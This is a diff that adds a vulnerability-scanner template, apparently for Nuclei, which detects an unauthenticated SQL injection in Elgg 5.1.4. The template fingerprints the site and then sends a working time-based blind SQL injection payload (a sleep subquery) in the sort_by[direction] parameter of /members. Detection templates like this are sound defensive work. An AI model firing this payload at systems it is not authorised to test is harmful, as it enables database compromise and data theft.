@@ -1,0 +1,49 @@
+id: elgg-sqli
+
+info:
+  name: Elgg 5.1.4 - SQL Injection
+  author: s4e-io
+  severity: high
+  description: |
+    Elgg 5.1.4 version has a SQL Injection vulnerability in the sort_by[direction] parameter. This vulnerability allows an unauthenticated attacker to manipulate SQL queries by injecting malicious SQL code, potentially leading to unauthorized data access or database compromise. No user authentication is required to exploit this vulnerability.
+  reference:
+    - https://github.com/4rdr/proofs/blob/main/info/Elgg_unauth_SQLi_5.1.4.md
+    - https://github.com/Elgg/Elgg
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: elgg
+    product: elgg
+    fofa-query: icon_hash="413602919"
+  tags: elgg,sqli
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body,"elgg.js")'
+          - 'status_code == 200'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        @timeout 20s
+        GET /members?sort_by%5Bproperty%5D=name&sort_by%5Bproperty_type%5D=metadata&sort_by%5Bdirection%5D=desc%2c(select*from(select(sleep(6)))a) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration >= 6'
+          - 'contains(body,"All members")'
+          - 'status_code == 200'
+        condition: and
+# digest: 4a0a00473045022055e76939530e4a2ea815987014ec77153691f482b202d090a914a23b07b4beaf022100a90e28a291b5c73bab0de821409d3bc71e2d7ebfc961734903bf8cbd4e50c405:922c64590222798bb761d5b6d8e72950
